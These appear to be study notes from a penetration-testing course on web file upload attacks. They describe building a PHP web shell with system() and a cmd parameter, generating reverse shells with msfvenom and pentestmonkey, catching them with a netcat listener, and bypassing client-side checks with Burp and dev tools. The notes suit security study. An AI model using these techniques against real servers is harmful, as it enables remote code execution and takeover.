# File Upload Attacks

## Intro to File Upload Attacks

a key feature of most web apps is to upload user files   
this comes with the risk of allowing users to store their malicious files on the web app back-end server  
could lead to arbitrary command execution to take control of backend server

### Types of file upload attacks 

most common reason for file upload vulnerabilities is weak file validation and verification  

worst possible kind of file upload vulnerability is an `unauthenticated arbitrary file upload`  
this will allow any unauthenticated user to upload any file type  

if filters such as extension and content validation are not secure then we might be able to bypass them 

most common and critical attack caused by arbitrary file uploads is `gaining remote command execution` over the backend server by uploading a web shell or script that sends a reverse shell  

web shell = execute any command and can be turned into an interactive shell  
reverse shell = upload script that sends shell to listener on our machine and interact with the remote server that way 

there may still be other ways to exploit the file upload functionality if protections are missing: 
- XSS or XXE
- DoS 
- overwrite critical system files and configs 
- etc

file upload vulnerabilities are not only caused by writing insecure functions but also by outdated libraries 

## Absent Validation 

the most basic type of file upload vulnerabilities occur when the app doesn't have any form of validation filters for uploaded files 

in these attacks we may directly upload our web shell or reverse shell and then visit the uploaded script to interact with our shell or send the reverse shell 

### Arbitrary file upload 

our target has an upload file field:  

![](Images/Pasted%20image%2020240207182323.png)

we can see that when we try to upload the file that all file types are allowed: 

![](Images/Pasted%20image%2020240207182401.png)

### Identifying web framework 

we need to upload a malicious script to test if we can upload any file type to the backend server so we can see if we can use this to exploit the server 

a web shell gives us an easy method to interact with the backend server by accepting shell commands and printing output back to us in the web browser  
needs to be written in the same language that runs the web server  

sometimes we can see the language by just looking at the page extension in the url, but some frameworks use web routes to map urls to web pages which might not show the extension  
also, with routes our file upload exploitation would be different because our files wouldn't be directly routable or accessible 

an easy way to see what language the server uses is visiting the `/index.ext` page where we would swap `ext` with common web extensions like `php`, `asp`, `aspx`, etc. 

when we try `/index.php` we get the same page we were visiting, which means that this is a PHP application: 

![](Images/Pasted%20image%2020240207182938.png)

using this or other methods like fuzzers may not always be accurate because web apps might not utilize index pages or may use more than one web extension 

could also use `wappalyzer` 

### Vulnerability identification 

now that we know that the server uses php we can submit a hello world php file and look for the ouput: 

![](Images/Pasted%20image%2020240207183844.png)

we could also use a script with something like `<?php echo system('hostname'); ?>`: 

![](Images/Pasted%20image%2020240207184236.png)

## Upload Exploitation 

### Web shells 

there are many web shells online that have different features/purposes   
PHP has `phpbash` which provides a terminal-like, semi-interactive web shell   
SecLists also has web shells for different frameworks and languages in `/opt/useful/SecLists/Web-Shells`

### Writing custom web shell 

for php we can use `system()` to execute system commands and print their output  
then we can use `cmd` with `$_REQUEST['cmd']`  
then when we visit our script on the app we can execute system commands with `?cmd=<command>`

remember that sometimes viewing the output in the source may be better 

for .NET apps we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function and it should execute the command in `?cmd=` 

### Reverse shell 

a reliable reverse shell for PHP is `pentestmonkey`, but SecLists also has some 

to use pentestmonkey we can download the shell then edit in our target's IP and port, then we can start a netcat listener on our machine with the specified port with `nc -lnvp <port>`

### Generating custom reverse shell scripts 

always better to use core web framework functions to connect to our machine 

`msfvenom` can generate reverse shell scripts for many languages and might even try to bypass restrictions in place 

`msfvenom -p php/revers_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

then we can again set up a listener with netcat and visit the uploaded file 


`-p` - payloads  
`-f` - specify output language

reverse shells are always preferred over web shells because they have the most interactive method for controlling the compromised server, but they might not always work  

## Client-Side Validation 

can easily bypass apps with only client-side validation by interacting with the server or by modifying the front-end code through the browser's dev tools

### Client-side validation 

now our target specifies a list of accepted file extensions, even if we select all file types: 

![](Images/Pasted%20image%2020240208090209.png)

no requests seem to be made and the page does not refresh  
we also have control over any client-side code executed in our browser  

### Back-end request modification 

when we upload a normal file and capture it with burp we can see the png request: 

![](Images/Pasted%20image%2020240208090956.png)

so now we can modify the filename and content to be our shell script and get a successful upload: 

![](Images/Pasted%20image%2020240208091258.png)

we could have also changed the `Content-Type` of the file but at this stage this shouldn't be too important 

we can revisit the site and see our uploaded script: 

![](Images/Pasted%20image%2020240208091800.png)

### Disabling front-end validation 

client-side code can be modified or disabled entirely 

in our example we can see an input element with `onchange` and `accept` attributes: 

![](Images/Pasted%20image%2020240208092324.png)

the `accept` isn't necessary to change because through the UI we can select "All Files"

with any function like the the one in `onchange` we can type the function name in the devtools console to get its details 

code like this we can simply remove via editing the HTML: 

![](Images/Pasted%20image%2020240208092639.png)

however these changes will not persist through page refresh 

